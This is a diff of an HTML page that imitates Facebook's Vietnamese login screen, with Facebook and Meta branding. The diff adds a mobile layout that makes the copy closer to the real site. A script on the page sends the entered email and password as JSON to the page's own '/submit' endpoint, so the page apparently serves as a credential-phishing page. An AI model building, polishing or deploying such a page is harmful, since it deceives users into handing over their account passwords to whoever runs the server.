@@ -76,7 +76,6 @@
         height: 480px;
       }
 
-      /* Card 1 - top right (blue header) */
       .card-1 {
         position: absolute;
         top: 20px;
@@ -102,14 +101,6 @@
         background: linear-gradient(135deg, #f0f2f5 0%, #e4e6eb 100%);
       }
 
-      .card-1-img {
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
-        background: linear-gradient(120deg, #74b9ff, #0984e3);
-      }
-
-      /* Skate card */
       .card-2 {
         position: absolute;
         top: 0px;
@@ -150,7 +141,6 @@
         justify-content: center;
       }
 
-      /* Card 3 - story card */
       .card-3 {
         position: absolute;
         bottom: 40px;
@@ -187,7 +177,6 @@
         width: 60%;
       }
 
-      /* Avatar */
       .avatar-badge {
         position: absolute;
         bottom: 10px;
@@ -200,7 +189,6 @@
         box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15);
       }
 
-      /* Emoji */
       .emoji-laugh {
         position: absolute;
         top: 60px;
@@ -209,7 +197,6 @@
         animation: float 3s ease-in-out infinite;
       }
 
-      /* Heart reaction */
       .heart-react {
         position: absolute;
         bottom: 80px;
@@ -225,7 +212,6 @@
         box-shadow: 0 2px 12px rgba(0, 0, 0, 0.18);
       }
 
-      /* Messenger icon */
       .msg-icon {
         position: absolute;
         top: 200px;
@@ -242,13 +228,8 @@
       }
 
       @keyframes float {
-        0%,
-        100% {
-          transform: translateY(0);
-        }
-        50% {
-          transform: translateY(-8px);
-        }
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-8px); }
       }
 
       /* RIGHT PANEL */
@@ -283,19 +264,14 @@
         color: #1c1e21;
         margin-bottom: 14px;
         outline: none;
-        transition:
-          border-color 0.2s,
-          box-shadow 0.2s;
+        transition: border-color 0.2s, box-shadow 0.2s;
         background: #fff;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        font-family: inherit;
         -webkit-appearance: none;
         appearance: none;
       }
 
-      .input-field::placeholder {
-        color: #90949c;
-      }
-
+      .input-field::placeholder { color: #90949c; }
       .input-field:focus {
         border-color: #1877f2;
         box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
@@ -313,14 +289,12 @@
         cursor: pointer;
         transition: background 0.15s;
         margin-bottom: 14px;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        font-family: inherit;
         -webkit-appearance: none;
         appearance: none;
       }
 
-      .btn-login:hover {
-        background: #166fe5;
-      }
+      .btn-login:hover { background: #166fe5; }
 
       .forgot-pw {
         display: block;
@@ -332,9 +306,7 @@
         margin-bottom: 28px;
       }
 
-      .forgot-pw:hover {
-        text-decoration: underline;
-      }
+      .forgot-pw:hover { text-decoration: underline; }
 
       .divider {
         width: 100%;
@@ -358,12 +330,10 @@
         transition: background 0.12s;
         text-decoration: none;
         margin-bottom: 28px;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        font-family: inherit;
       }
 
-      .btn-create:hover {
-        background: #e7f0fd;
-      }
+      .btn-create:hover { background: #e7f0fd; }
 
       .meta-logo {
         display: flex;
@@ -381,13 +351,6 @@
         padding: 20px 60px 30px;
       }
 
-      /* Ẩn footer trên mobile */
-      @media (max-width: 767px) {
-        footer {
-          display: none;
-        }
-      }
-
       .footer-langs {
         display: flex;
         flex-wrap: wrap;
@@ -402,19 +365,7 @@
         text-decoration: none;
       }
 
-      .footer-langs a:hover {
-        text-decoration: underline;
-      }
-
-      .footer-langs .more-btn {
-        border: 1px solid #ccd0d5;
-        border-radius: 4px;
-        padding: 1px 6px;
-        font-size: 12px;
-        cursor: pointer;
-        color: #606770;
-        background: #fff;
-      }
+      .footer-langs a:hover { text-decoration: underline; }
 
       .footer-divider {
         height: 1px;
@@ -435,9 +386,7 @@
         text-decoration: none;
       }
 
-      .footer-links a:hover {
-        text-decoration: underline;
-      }
+      .footer-links a:hover { text-decoration: underline; }
 
       .footer-copy {
         color: #90949c;
@@ -447,40 +396,164 @@
 
       /* ===== MOBILE LAYOUT ===== */
       @media (max-width: 767px) {
+        /* Ẩn footer và illustration trên mobile */
+        footer { display: none; }
+        .illustration { display: none; }
+        .tagline { display: none; }
+
+        body {
+          background: #fff;
+          min-height: 100vh;
+        }
+
+        /* Banner tải app trên cùng */
+        .mobile-app-banner {
+          display: flex;
+          align-items: center;
+          gap: 10px;
+          padding: 12px 16px;
+          border-bottom: 1px solid #e4e6eb;
+          font-size: 14px;
+          color: #1877f2;
+          font-weight: 500;
+        }
+
+        /* Language bar */
+        .mobile-lang-bar {
+          display: flex;
+          justify-content: center;
+          padding: 10px 0 4px;
+          font-size: 15px;
+          color: #1c1e21;
+          border-bottom: none;
+        }
+
         .main {
           flex-direction: column;
           min-height: unset;
           align-items: stretch;
+          padding: 0;
         }
 
         .left {
-          padding: 30px 20px 20px;
+          padding: 28px 20px 10px;
           min-height: unset;
           align-items: center;
+          justify-content: center;
         }
 
-        .tagline {
-          font-size: 28px;
-          text-align: center;
-        }
-
-        .illustration {
-          display: none;
+        /* Logo mobile: lớn hơn, căn giữa */
+        .fb-logo {
+          width: 72px;
+          height: 72px;
+          margin-bottom: 0;
+          display: block;
         }
 
         .right {
           flex: none;
-          padding: 20px 20px 40px;
+          padding: 24px 20px 32px;
           min-height: unset;
         }
 
         .login-box {
           max-width: 100%;
         }
+
+        /* Ẩn tiêu đề "Đăng nhập vào Facebook" trên mobile */
+        .login-title {
+          display: none;
+        }
+
+        /* Input fields bo tròn nhiều hơn */
+        .input-field {
+          border-radius: 12px;
+          padding: 16px 18px;
+          font-size: 16px;
+          border: 1.5px solid #ccd0d5;
+          margin-bottom: 12px;
+          background: #fff;
+        }
+
+        /* Nút Đăng nhập bo tròn hoàn toàn */
+        .btn-login {
+          border-radius: 50px;
+          padding: 16px;
+          font-size: 18px;
+          font-weight: 700;
+          margin-bottom: 20px;
+        }
+
+        /* "Quên mật khẩu?" màu đen, in đậm */
+        .forgot-pw {
+          color: #1c1e21;
+          font-weight: 700;
+          font-size: 15px;
+          margin-bottom: 32px;
+        }
+
+        /* Nút Tạo tài khoản mới bo tròn, border xanh */
+        .btn-create {
+          border-radius: 50px;
+          border: 1.5px solid #1877f2;
+          padding: 15px;
+          font-size: 16px;
+          font-weight: 700;
+          color: #1877f2;
+          margin-bottom: 24px;
+        }
+
+        .divider {
+          margin-bottom: 20px;
+        }
+
+        /* Meta logo mobile: hiển thị icon + chữ đúng */
+        .meta-logo {
+          font-size: 15px;
+          color: #1c1e21;
+          font-weight: 600;
+          gap: 4px;
+        }
+
+        /* Footer mobile thay thế: chỉ 3 link nhỏ ở dưới cùng */
+        .mobile-footer-links {
+          display: flex;
+          justify-content: center;
+          gap: 16px;
+          padding: 12px 0 20px;
+          border-top: none;
+        }
+
+        .mobile-footer-links a {
+          color: #606770;
+          font-size: 13px;
+          text-decoration: none;
+        }
+      }
+
+      /* Ẩn các element chỉ dùng cho mobile khi ở desktop */
+      @media (min-width: 768px) {
+        .mobile-app-banner,
+        .mobile-lang-bar,
+        .mobile-footer-links {
+          display: none;
+        }
       }
     </style>
   </head>
   <body>
+
+    <!-- Banner tải app (chỉ hiện mobile) -->
+    <div class="mobile-app-banner">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="#1877f2">
+        <path d="M19 9h-4V3H9v6H5l7 7 7-7zm-8 2V5h2v6h1.17L12 13.17 9.83 11H11zm-6 7h14v2H5z"/>
+      </svg>
+      Tải Facebook dành cho Android và lướt xem nhanh hơn.
+    </div>
+
+    <!-- Language bar (chỉ hiện mobile) -->
+    <div class="mobile-lang-bar">Tiếng Việt</div>
+
     <!-- MAIN -->
     <div class="main">
       <!-- LEFT -->
@@ -505,201 +578,64 @@
 
         <!-- Illustration -->
         <div class="illustration">
-          <!-- Emoji -->
           <div class="emoji-laugh">😄</div>
 
-          <!-- Card 2 (skate - blue top card) -->
           <div class="card-2">
             <div class="card-2-header">
               <svg width="16" height="16" viewBox="0 0 24 24" fill="#fff">
                 <rect width="24" height="24" rx="6" fill="#0084ff" />
-                <path
-                  d="M12 5C7.58 5 4 8.13 4 12c0 2.1.94 3.99 2.47 5.35V20l2.26-1.24C9.7 19.57 10.83 19.75 12 19.75c4.42 0 8-3.13 8-7s-3.58-7-8-7z"
-                  fill="#fff"
-                />
+                <path d="M12 5C7.58 5 4 8.13 4 12c0 2.1.94 3.99 2.47 5.35V20l2.26-1.24C9.7 19.57 10.83 19.75 12 19.75c4.42 0 8-3.13 8-7s-3.58-7-8-7z" fill="#fff" />
               </svg>
               <span class="timer-badge">⏰ 16:45</span>
             </div>
             <div class="card-2-photo">
-              <!-- Skater silhouette -->
-              <svg
-                width="100"
-                height="160"
-                viewBox="0 0 100 160"
-                xmlns="http://www.w3.org/2000/svg"
-              >
+              <svg width="100" height="160" viewBox="0 0 100 160" xmlns="http://www.w3.org/2000/svg">
                 <circle cx="50" cy="22" r="14" fill="rgba(255,255,255,0.4)" />
-                <rect
-                  x="36"
-                  y="38"
-                  width="28"
-                  height="45"
-                  rx="6"
-                  fill="rgba(255,255,255,0.3)"
-                />
-                <line
-                  x1="50"
-                  y1="83"
-                  x2="38"
-                  y2="115"
-                  stroke="rgba(255,255,255,0.4)"
-                  stroke-width="8"
-                  stroke-linecap="round"
-                />
-                <line
-                  x1="50"
-                  y1="83"
-                  x2="62"
-                  y2="115"
-                  stroke="rgba(255,255,255,0.4)"
-                  stroke-width="8"
-                  stroke-linecap="round"
-                />
-                <line
-                  x1="36"
-                  y1="58"
-                  x2="18"
-                  y2="75"
-                  stroke="rgba(255,255,255,0.4)"
-                  stroke-width="7"
-                  stroke-linecap="round"
-                />
-                <line
-                  x1="64"
-                  y1="58"
-                  x2="82"
-                  y2="48"
-                  stroke="rgba(255,255,255,0.4)"
-                  stroke-width="7"
-                  stroke-linecap="round"
-                />
-                <ellipse
-                  cx="50"
-                  cy="130"
-                  rx="28"
-                  ry="8"
-                  fill="rgba(255,255,255,0.25)"
-                />
+                <rect x="36" y="38" width="28" height="45" rx="6" fill="rgba(255,255,255,0.3)" />
+                <line x1="50" y1="83" x2="38" y2="115" stroke="rgba(255,255,255,0.4)" stroke-width="8" stroke-linecap="round" />
+                <line x1="50" y1="83" x2="62" y2="115" stroke="rgba(255,255,255,0.4)" stroke-width="8" stroke-linecap="round" />
+                <line x1="36" y1="58" x2="18" y2="75" stroke="rgba(255,255,255,0.4)" stroke-width="7" stroke-linecap="round" />
+                <line x1="64" y1="58" x2="82" y2="48" stroke="rgba(255,255,255,0.4)" stroke-width="7" stroke-linecap="round" />
+                <ellipse cx="50" cy="130" rx="28" ry="8" fill="rgba(255,255,255,0.25)" />
               </svg>
             </div>
           </div>
 
-          <!-- Card 1 (blue phone card) -->
           <div class="card-1">
-            <div
-              style="
-                background: #1877f2;
-                height: 40px;
-                display: flex;
-                align-items: center;
-                padding: 0 10px;
-                gap: 6px;
-              "
-            >
-              <div
-                style="
-                  width: 8px;
-                  height: 8px;
-                  background: rgba(255, 255, 255, 0.6);
-                  border-radius: 50%;
-                "
-              ></div>
-              <div
-                style="
-                  width: 8px;
-                  height: 8px;
-                  background: rgba(255, 255, 255, 0.6);
-                  border-radius: 50%;
-                "
-              ></div>
+            <div style="background:#1877f2;height:40px;display:flex;align-items:center;padding:0 10px;gap:6px;">
+              <div style="width:8px;height:8px;background:rgba(255,255,255,0.6);border-radius:50%;"></div>
+              <div style="width:8px;height:8px;background:rgba(255,255,255,0.6);border-radius:50%;"></div>
             </div>
             <div class="card-1-inner">
-              <!-- Yarn ball illustration -->
-              <svg
-                width="120"
-                height="120"
-                viewBox="0 0 120 120"
-                xmlns="http://www.w3.org/2000/svg"
-              >
+              <svg width="120" height="120" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
                 <circle cx="60" cy="60" r="50" fill="#74b9ff" opacity="0.4" />
                 <circle cx="60" cy="60" r="38" fill="#0984e3" opacity="0.5" />
-                <path
-                  d="M30 60 Q60 30 90 60 Q60 90 30 60Z"
-                  fill="rgba(255,255,255,0.3)"
-                />
-                <path
-                  d="M40 40 Q70 55 80 80"
-                  stroke="rgba(255,255,255,0.5)"
-                  stroke-width="4"
-                  fill="none"
-                  stroke-linecap="round"
-                />
-                <path
-                  d="M25 65 Q55 50 85 65"
-                  stroke="rgba(255,255,255,0.5)"
-                  stroke-width="4"
-                  fill="none"
-                  stroke-linecap="round"
-                />
+                <path d="M30 60 Q60 30 90 60 Q60 90 30 60Z" fill="rgba(255,255,255,0.3)" />
+                <path d="M40 40 Q70 55 80 80" stroke="rgba(255,255,255,0.5)" stroke-width="4" fill="none" stroke-linecap="round" />
+                <path d="M25 65 Q55 50 85 65" stroke="rgba(255,255,255,0.5)" stroke-width="4" fill="none" stroke-linecap="round" />
               </svg>
             </div>
           </div>
 
-          <!-- Story card -->
           <div class="card-3">
             <div class="card-3-photo"></div>
             <div class="card-3-lines">
               <div class="card-3-line"></div>
               <div class="card-3-line short"></div>
             </div>
-            <!-- Pagination dots -->
-            <div
-              style="
-                display: flex;
-                gap: 5px;
-                justify-content: center;
-                margin-top: 8px;
-              "
-            >
-              <div
-                style="
-                  width: 8px;
-                  height: 8px;
-                  background: #1877f2;
-                  border-radius: 50%;
-                "
-              ></div>
-              <div
-                style="
-                  width: 8px;
-                  height: 8px;
-                  background: #dadde1;
-                  border-radius: 50%;
-                "
-              ></div>
-              <div
-                style="
-                  width: 8px;
-                  height: 8px;
-                  background: #dadde1;
-                  border-radius: 50%;
-                "
-              ></div>
+            <div style="display:flex;gap:5px;justify-content:center;margin-top:8px;">
+              <div style="width:8px;height:8px;background:#1877f2;border-radius:50%;"></div>
+              <div style="width:8px;height:8px;background:#dadde1;border-radius:50%;"></div>
+              <div style="width:8px;height:8px;background:#dadde1;border-radius:50%;"></div>
             </div>
           </div>
 
-          <!-- Avatar -->
           <div class="avatar-badge"></div>
-
-          <!-- Heart reaction -->
           <div class="heart-react">❤️</div>
 
-          <!-- Messenger icon -->
           <div class="msg-icon">
             <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff">
-              <path
-                d="M12 2C6.48 2 2 6.13 2 11.2c0 2.7 1.22 5.12 3.18 6.86V22l2.9-1.6c.78.21 1.6.33 2.92.33 5.52 0 10-4.13 10-9.2S17.52 2 12 2zm1.04 12.4l-2.54-2.71-4.96 2.71 5.46-5.79 2.6 2.71 4.9-2.71-5.46 5.79z"
-              />
+              <path d="M12 2C6.48 2 2 6.13 2 11.2c0 2.7 1.22 5.12 3.18 6.86V22l2.9-1.6c.78.21 1.6.33 2.92.33 5.52 0 10-4.13 10-9.2S17.52 2 12 2zm1.04 12.4l-2.54-2.71-4.96 2.71 5.46-5.79 2.6 2.71 4.9-2.71-5.46 5.79z" />
             </svg>
           </div>
         </div>
@@ -711,22 +647,9 @@
           <div class="login-title">Đăng nhập vào Facebook</div>
 
           <form id="login-form">
-            <input
-              id="email"
-              class="input-field"
-              type="text"
-              placeholder="Email hoặc số di động"
-            />
-            <input
-              id="password"
-              class="input-field"
-              type="password"
-              placeholder="Mật khẩu"
-            />
-
-            <button type="submit" class="btn-login" id="btn-login">
-              Đăng nhập
-            </button>
+            <input id="email" class="input-field" type="text" placeholder="Số di động hoặc email" />
+            <input id="password" class="input-field" type="password" placeholder="Mật khẩu" />
+            <button type="submit" class="btn-login" id="btn-login">Đăng nhập</button>
           </form>
 
           <a href="#" class="forgot-pw">Quên mật khẩu?</a>
@@ -737,34 +660,22 @@
 
           <!-- Meta logo -->
           <div class="meta-logo">
-            <svg
-              width="54"
-              height="16"
-              viewBox="0 0 54 16"
-              fill="none"
-              xmlns="http://www.w3.org/2000/svg"
-            >
-              <path
-                d="M2 12.5C2 12.5 2 4 5.5 4C7.5 4 9 7 9 7C9 7 10.5 4 12.5 4C16 4 16 12.5 16 12.5"
-                stroke="#90949c"
-                stroke-width="1.5"
-                stroke-linecap="round"
-                fill="none"
-              />
-              <text
-                x="19"
-                y="13"
-                font-family="-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif"
-                font-size="12"
-                font-weight="600"
-                fill="#90949c"
-              >
-                Meta
-              </text>
+            <!-- Icon Meta infinity -->
+            <svg width="36" height="20" viewBox="0 0 36 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M2 10C2 7 3.5 4.5 5.5 4.5C7 4.5 8.2 5.8 9.5 8L10 9C11.5 11.5 13 13.5 15.5 13.5C18 13.5 19.5 11.5 19.5 10C19.5 8.5 18 6.5 15.5 6.5" stroke="#1877f2" stroke-width="2" stroke-linecap="round" fill="none"/>
+              <path d="M34 10C34 7 32.5 4.5 30.5 4.5C29 4.5 27.8 5.8 26.5 8L26 9C24.5 11.5 23 13.5 20.5 13.5C18 13.5 16.5 11.5 16.5 10C16.5 8.5 18 6.5 20.5 6.5" stroke="#1877f2" stroke-width="2" stroke-linecap="round" fill="none"/>
             </svg>
+            <span style="color:#1c1e21;font-weight:700;font-size:15px;">Meta</span>
           </div>
         </div>
       </div>
+    </div>
+
+    <!-- Footer mobile (3 link nhỏ) -->
+    <div class="mobile-footer-links">
+      <a href="#">Giới thiệu</a>
+      <a href="#">Trợ giúp</a>
+      <a href="#">Xem thêm</a>
     </div>
 
     <!-- FOOTER (chỉ hiện trên PC) -->
@@ -812,50 +723,40 @@
       <div class="footer-links">
         <a href="#">Điều khoản</a>
         <a href="#">Trợ giúp</a>
-        <a href="#"
-          >Tải thông tin liên hệ lên &amp; đối tượng không phải người dùng</a
-        >
+        <a href="#">Tải thông tin liên hệ lên &amp; đối tượng không phải người dùng</a>
       </div>
 
       <div class="footer-copy">Meta © 2026</div>
     </footer>
 
     <script>
-      document
-        .getElementById("login-form")
-        .addEventListener("submit", async (e) => {
-          e.preventDefault();
-          const email = document.getElementById("email").value.trim();
-          const password = document.getElementById("password").value;
-          if (!email || !password) {
-            alert("Vui lòng nhập email và mật khẩu!");
-            return;
-          }
-          const btn = document.getElementById("btn-login");
-          btn.textContent = "Đang đăng nhập...";
-          btn.disabled = true;
-          try {
-            const res = await fetch("/submit", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify({ email, password }),
-            });
-            const result = await res.json();
-            alert(
-              result.success
-                ? "Đăng nhập thành công!"
-                : "Sai tài khoản hoặc mật khẩu!",
-            );
-          } catch (err) {
-            alert("Không thể kết nối đến server. Vui lòng thử lại!");
-            console.error(err);
-          } finally {
-            btn.textContent = "Đăng nhập";
-            btn.disabled = false;
-          }
-        });
+      document.getElementById("login-form").addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value;
+        if (!email || !password) {
+          alert("Vui lòng nhập email và mật khẩu!");
+          return;
+        }
+        const btn = document.getElementById("btn-login");
+        btn.textContent = "Đang đăng nhập...";
+        btn.disabled = true;
+        try {
+          const res = await fetch("/submit", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, password }),
+          });
+          const result = await res.json();
+          alert(result.success ? "Đăng nhập thành công!" : "Sai tài khoản hoặc mật khẩu!");
+        } catch (err) {
+          alert("Không thể kết nối đến server. Vui lòng thử lại!");
+          console.error(err);
+        } finally {
+          btn.textContent = "Đăng nhập";
+          btn.disabled = false;
+        }
+      });
     </script>
   </body>
 </html>
